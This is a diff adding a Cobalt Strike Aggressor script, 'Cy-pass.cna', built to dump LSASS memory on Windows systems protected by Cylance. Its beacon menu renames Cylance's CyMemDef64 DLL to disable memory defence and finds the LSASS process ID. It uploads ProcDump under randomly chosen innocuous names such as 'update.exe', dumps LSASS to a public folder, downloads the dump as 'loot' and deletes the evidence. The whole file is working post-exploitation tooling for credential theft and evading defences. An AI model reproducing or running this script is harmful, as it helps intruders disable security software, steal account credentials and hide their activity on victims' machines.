@@ -1,0 +1,121 @@
+# Cy-pass.cna
+# Dump LSASS.exe on systems running Cylance
+# UwU
+
+sub get_pid {
+
+				$to_match = $3;
+				bps($1, lambda({
+					local('$pid $name $entry');
+					foreach $entry (split("\n", $2)) {
+						($name, $null, $pid) = split("\\s+", $entry);
+						if ((lc($name) cmp lc($to_match)) == 0) {
+							[$callback: $1, $name, $pid];
+							$nPid = $pid;
+							return;
+						}
+					}
+				}, $callback => $2)); 
+			}
+
+popup beacon_bottom {
+	menu "CyPass" {
+	
+		item "Enable CyMemDef64" {
+		
+			bshell($1,"rename \"C:\\Program Files\\Cylance\\Desktop\\CyMemDef64bak.dll\" CyMemDef64.dll");
+			
+		}
+			
+		item "Disable CyMemDef64" {
+		
+			bshell($1,"rename \"C:\\Program Files\\Cylance\\Desktop\\CyMemDef64.dll\" CyMemDef64bak.dll");
+			
+		}
+		
+		item "Grab lsass PID" {
+			blog($1, "Getting the PID for LSASS");
+			get_pid($1, { $nPid = $3 }, "lsass.exe");
+		}
+
+		item "Dump LSASS" { 
+			
+			blog($1, "Lsass Pid = $nPid");
+		
+			$num = int(rand() * 100);
+			$ranNum = int($num % 4) + 1; 
+			
+			
+			blog($1, "Uploading ProcDump and Dumping LSASS");
+			
+		
+			if ($ranNum == 1){ 
+				
+				bupload($1, script_resource("Pack/backup.exe"));
+				bshell($1,"backup.exe -accepteula -ma $nPid C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			if ($ranNum == 2){ 
+			
+				bupload($1, script_resource("Pack/backupgenerator.exe"));
+				bshell($1,"backupgenerator.exe -accepteula -ma $nPid C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			if ($ranNum == 3){ 
+			
+				bupload($1, script_resource("Pack/helper.exe"));
+				bshell($1,"helper.exe -accepteula -ma $nPid C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			
+			if ($ranNum == 4){ 
+			
+				bupload($1, script_resource("Pack/update.exe"));
+				bshell($1,"update.exe -accepteula -ma $nPid C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			
+				
+			
+		}
+		item "Grab loot" {
+			
+			bdownload($1, "C:\\Users\\Public\\Downloads\\backup.dmp");
+		
+		}
+		item "Clean up" { 
+			if ($ranNum == 1){ 
+				
+				blog($1, "Cleaning up");
+				bshell($1,"del /f backup.exe");
+				bshell($1,"del /f C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			if ($ranNum == 2){ 
+			
+				blog($1, "Cleaning up");
+				bshell($1,"del /f backupgenerator.exe");
+				bshell($1,"del /f C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			if ($ranNum == 3){ 
+			
+				blog($1, "Cleaning up");
+				bshell($1,"del /f helper.exe");
+				bshell($1,"del /f C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}
+			
+			if ($ranNum == 4){ 
+			
+				blog($1, "Cleaning up");
+				bshell($1,"del /f update.exe");
+				bshell($1,"del /f C:\\Users\\Public\\Downloads\\backup.dmp");
+				
+			}	
+		
+		}
+	}	
+}
+
+
